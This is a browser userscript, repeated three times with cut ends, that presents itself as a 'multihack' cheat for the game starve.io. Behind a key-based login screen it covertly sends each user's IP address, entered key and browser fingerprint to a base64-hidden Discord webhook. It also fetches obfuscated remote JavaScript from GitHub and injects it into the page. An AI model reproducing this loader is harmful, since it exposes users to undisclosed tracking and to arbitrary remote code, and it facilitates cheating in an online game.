            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
